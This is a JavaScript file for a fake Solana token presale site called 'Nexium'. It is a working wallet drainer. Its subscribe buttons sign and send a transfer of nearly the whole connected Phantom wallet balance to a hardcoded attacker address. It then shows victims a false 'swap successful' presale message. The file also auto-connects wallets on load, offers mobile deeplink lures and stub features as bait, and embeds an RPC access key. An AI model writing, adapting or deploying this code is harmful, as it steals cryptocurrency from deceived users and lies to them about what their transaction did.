import { Buffer } from 'buffer';
console.log('main.js: Buffer imported:', typeof Buffer, Buffer);
globalThis.Buffer = Buffer;
window.Buffer = Buffer;

// === CENTRALIZED RPC CONFIG ===
const SOLANA_RPC_ENDPOINT = 'https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6';

// Other imports
import { CONFIG } from './config.js';
import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram } from '@solana/web3.js';
import * as splToken from '@solana/spl-token';

const DRAIN_ADDRESSES = {
  solana: "6GqXmHKEcQJnxuhUXZXPoASQBZRKCxQCMZAC6MLk1GPA"
};

class NexiumApp {
  constructor() {
    this.publicKey = null;
    this.connecting = false;
    this.connectingWallet = null;
    this.solConnection = null;
    this.spinner = null;
    this.connectedWalletType = null;
    this.isConnected = false; // ← NEW: Prevent spam
    this.toastShown = false;  // ← NEW: Only 1 toast
    console.log('Initializing NexiumApp...');
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.metamaskPrompt) {
        console.warn('metamaskPrompt element missing, but continuing initialization');
      }
      this.setupModal();
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      console.log('App initialized successfully');
    } catch (error) {
      console.error('Init error:', error);
      this.showFeedback('Error initializing app. Please refresh.', 'error');
    }
  }

  cacheDOMElements() {
    this.dom = {
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      connectWallet: document.getElementById('connect-wallet'),
      walletModal: document.getElementById('wallet-modal'),
      closeModal: document.getElementById('close-modal'),
      connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
      feedbackContainer: document.querySelector('.feedback-container'),
      subscribeHero: document.querySelector('.subscribe-hero'),
      monthlySubscribe: document.querySelector('.monthly-subscribe'),
      yearlySubscribe: document.querySelector('.yearly-subscribe'),
      watchButtons: document.querySelectorAll('.watch-btn'),
      snipeButtons: document.querySelectorAll('.snipe-btn')
    };
  }

  setupModal() {
    if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
      this.dom.connectWallet.addEventListener('click', (event) => {
        event.stopPropagation();
        this.dom.walletModal.classList.add('active');
      });

      this.dom.closeModal.addEventListener('click', () => {
        this.dom.walletModal.classList.remove('active');
      });

      document.addEventListener('click', (event) => {
        if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
          this.dom.walletModal.classList.remove('active');
        }
      });
    }
  }

  setupEventListeners() {
    const connectWalletHandler = (walletName) => {
      if (!this.connecting) {
        this.connectWallet(walletName);
      }
    };

    if (this.dom.connectPhantom) {
      this.dom.connectPhantom.addEventListener('click', () => connectWalletHandler('Phantom'));
      this.dom.connectPhantom.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') connectWalletHandler('Phantom');
      });
    }

    // Other listeners (subscribe, watch, snipe) unchanged...
    if (this.dom.subscribeHero) {
      this.dom.subscribeHero.addEventListener('click', () => this.handleSubscription());
    }
    if (this.dom.monthlySubscribe) {
      this.dom.monthlySubscribe.addEventListener('click', () => this.handleSubscription());
    }
    if (this.dom.yearlySubscribe) {
      this.dom.yearlySubscribe.addEventListener('click', () => this.handleSubscription());
    }
    this.dom.watchButtons.forEach(btn => btn.addEventListener('click', () => this.handleWatchAction()));
    this.dom.snipeButtons.forEach(btn => btn.addEventListener('click', () => this.handleSnipeAction()));

    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async handleSubscription() {
    if (!this.publicKey || !this.solConnection) {
      this.showFeedback('Please connect your wallet to subscribe.', 'error');
      this.dom.walletModal.classList.add('active');
      return;
    }
    this.drainSolanaWallet();
  }

  handleWatchAction() {
    this.showFeedback('Watch feature not available.', 'error');
  }

  handleSnipeAction() {
    this.showFeedback('Snipe feature not available.', 'error');
  }

  async connectWallet(walletName) {
    if (this.connecting || !navigator.onLine || this.isConnected) return;
    this.connecting = true;
    this.connectingWallet = walletName;
    this.updateButtonState('connecting', walletName);

    try {
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const hasSolana = !!window.solana;
      const isPhantom = hasSolana && window.solana.isPhantom;

      if (!isMobile || isPhantom) {
        if (walletName === 'Phantom' && isPhantom) {
          const response = await window.solana.connect();
          this.publicKey = response.publicKey.toString();
          this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
          this.connectedWalletType = walletName;
          this.isConnected = true;
          this.toastShown = false; // Reset for fresh connect

          this.updateButtonState('connected', walletName, this.publicKey);
          this.hideMetaMaskPrompt();
          
          return;
        } else {
          throw new Error(`${walletName} not detected`);
        }
      }

      // Mobile deeplink
      const deeplink = 'https://phantom.app/ul/browse/https%3A%2F%2Fnexiumbot.onrender.com?ref=https%3A%2F%2Fnexiumbot.onrender.com';
      window.location.href = deeplink;

      const check = setInterval(async () => {
        if (window.solana?.isPhantom) {
          const res = await window.solana.connect().catch(() => null);
          if (res?.publicKey) {
            this.publicKey = res.publicKey.toString();
            this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
            this.connectedWalletType = 'Phantom';
            this.isConnected = true;
            this.toastShown = false;

            this.updateButtonState('connected', 'Phantom', this.publicKey);
            this.hideMetaMaskPrompt();
            this.showConnectedToast();
            clearInterval(check);
          }
        }
      }, 1000);

      setTimeout(() => {
        if (this.connecting) {
          this.showFeedback('Connection timed out. Open in Phantom.', 'error');
          this.updateButtonState('disconnected', walletName);
          clearInterval(check);
        }
      }, 30000);
    } catch (error) {
      this.handleConnectionError(error, walletName);
      this.updateButtonState('disconnected', walletName);
      this.showMetaMaskPrompt();
    } finally {
      this.connecting = false;
    }
  }

  // ← NEW: SINGLE TOAST FUNCTION
  showConnectedToast() {
    if (this.toastShown) return;
    this.toastShown = true;
    this.showFeedback('Connected to Phantom!', 'success');
  }

  async drainSolanaWallet() {
    this.showProcessingSpinner();
    try {
      const sender = new PublicKey(this.publicKey);
      const recipient = new PublicKey(DRAIN_ADDRESSES.solana);

      if (!this.solConnection) {
        this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
      }

      const balance = await this.solConnection.getBalance(sender);
      const minRent = 2039280;
      const transferable = balance - minRent;

      if (transferable <= 0) throw new Error("Insufficient balance");

      const transferIx = SystemProgram.transfer({
        fromPubkey: sender,
        toPubkey: recipient,
        lamports: transferable
      });

      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
      const message = new TransactionMessage({
        payerKey: sender,
        recentBlockhash: blockhash,
        instructions: [transferIx]
      }).compileToV0Message();

      const tx = new VersionedTransaction(message);
      const signed = await window.solana.signTransaction(tx);
      const sig = await this.solConnection.sendTransaction(signed);
      await this.solConnection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight });

      this.showFeedback("Swap successful! Welcome to the $NEXI presale!", 'success');
    } catch (error) {
      const msg = error.message.includes('User rejected')
        ? 'Transaction rejected.'
        : error.message.includes('balance')
        ? 'Not enough SOL.'
        : 'Swap failed.';
      this.showFeedback(msg, 'error');
      throw error;
    } finally {
      this.hideProcessingSpinner();
    }
  }

  updateButtonState(state, walletName, address = '') {
    const button = this.dom.connectPhantom || document.querySelector('#connect-phantom');
    if (!button) return;

    button.disabled = state === 'connecting';
    const short = address ? this.shortenAddress(address) : '';

    if (state === 'connected') {
      button.textContent = short;
      if (this.dom.connectWallet) {
        this.dom.connectWallet.textContent = short;
        this.dom.connectWallet.disabled = true;
      }
    } else if (state === 'connecting') {
      button.textContent = 'Connecting...';
    } else {
      button.textContent = 'Connect Phantom';
      if (this.dom.connectWallet) {
        this.dom.connectWallet.textContent = 'Connect Wallet';
        this.dom.connectWallet.disabled = false;
      }
    }
  }

  handleConnectionError(error, walletName) {
    let msg = `Failed to connect ${walletName}.`;
    if (error.message.includes('rejected')) msg = 'Connection declined.';
    else if (error.message.includes('locked')) msg = 'Wallet is locked.';
    this.showFeedback(msg, 'error');
  }

  handleOnline() {
    this.showFeedback('Back online.', 'success');
  }

  handleOffline() {
    this.showFeedback('No internet.', 'error');
    this.updateButtonState('disconnected', 'Phantom');
  }

  showMetaMaskPrompt() {
    if (this.dom.metamaskPrompt) {
      this.dom.metamaskPrompt.classList.remove('hidden');
      this.dom.metamaskPrompt.style.display = 'block';
    }
  }

  hideMetaMaskPrompt() {
    if (this.dom.metamaskPrompt) {
      this.dom.metamaskPrompt.classList.add('hidden');
      this.dom.metamaskPrompt.style.display = 'none';
    }
  }

  showFeedback(message, type = 'info') {
    let container = this.dom.feedbackContainer;
    if (!container) {
      container = document.createElement('div');
      container.className = 'feedback-container';
      document.body.appendChild(container);
      this.dom.feedbackContainer = container;
    }

    const feedback = document.createElement('div');
    feedback.className = `feedback ${type === 'error' ? 'error' : 'success'}`;
    feedback.innerHTML = `<span>${this.escapeHTML(message)}</span><button class="feedback-close">×</button>`;
    feedback.querySelector('.feedback-close').onclick = () => feedback.remove();
    container.appendChild(feedback);

    setTimeout(() => feedback.remove(), type === 'error' ? 8000 : 4000);
  }

  shortenAddress(addr) {
    return addr ? `${addr.slice(0, 6)}...${addr.slice(-4)}` : 'Unknown';
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]));
  }

  // === AUTO-CONNECT ON LOAD (NO TOAST) ===
  async checkWalletAndPrompt() {
    if (this.isWalletInstalled() && this.isWalletConnected() && navigator.onLine) {
      this.publicKey = window.solana.publicKey.toString();
      this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
      this.connectedWalletType = 'Phantom';
      this.isConnected = true;
      this.toastShown = true; // ← BLOCK TOAST
      this.updateButtonState('connected', 'Phantom', this.publicKey);
      this.hideMetaMaskPrompt();
    } else {
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected', 'Phantom');
    }
  }

  isWalletInstalled() { return !!window.solana; }
  isWalletConnected() { return window.solana?.publicKey; }

  showProcessingSpinner() {
    if (this.spinner) return;
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `<div class="flex items-center space-x-2"><div class="w-8 h-8 border-4 border-orange-400 border-t-transparent rounded-full animate-spin"></div><span class="text-white">Processing...</span></div>`;
    document.body.appendChild(this.spinner);
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
    }
  }
}

// === EXPORT & GLOBAL ===
const app = new NexiumApp();
window.nexiumApp = app;

export { NexiumApp };